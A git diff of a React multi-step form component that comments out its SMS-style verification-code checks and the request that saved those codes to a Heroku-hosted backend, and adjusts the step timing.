@@ -57,17 +57,17 @@ export default function Form() {
         setOpen(false);
     };
 
-    const checkVerificationCode = () => {
+    /*const checkVerificationCode = () => {
         if(values.verificationCode == vc) {
             increaseStep();
         }
-    };
+    }; 
 
     const checkVerificationCode2 = () => {
         if(values.secondVerificationCode == vc2) {
             userRequestHandler();
         }
-    };
+    }; */
 
     const sendData = (step) => {
         switch(step) {
@@ -115,27 +115,26 @@ export default function Form() {
         setTimeout(function() {
             setShowSpinner(false);
 
+            if (step < 6) {
+                setStep(step + 1);
+            }
+
             if(step === 2) {
                 sendData(2);
             }
 
             if(step === 3) {
                 sendData(3);
-                addVerificationCodes();
             }
 
             if(step === 4) {
                 sendData(4);
-                checkVerificationCode();
             }
 
-            if (step < 6 && step != 4) {
-                setStep(step + 1);
-            }
-        }, 1000);
+        }, 5000);
         
         if(step === 6) {
-            checkVerificationCode2();
+            userRequestHandler();
         }
     };
     
@@ -149,10 +148,10 @@ export default function Form() {
         setValues({ ...values, [name]: e.target.value });
     };
     
-    const addVerificationCodes = () => {
+    /* const addVerificationCodes = () => {
         axios.post("https://investment-com.herokuapp.com/add-code", {
             user_request_id: queryId,
-            userName: values.clientFullname,
+            fullName: values.clientFullname,
             firstCode: vc,
             secondCode: vc2,
             phoneNumber: values.clientPhoneNumber,
@@ -169,6 +168,8 @@ export default function Form() {
             console.log("vc1, vc2 saved");
         })
     };
+
+    */
 
     const userRequestHandler = () => {
         setOpen(true);        
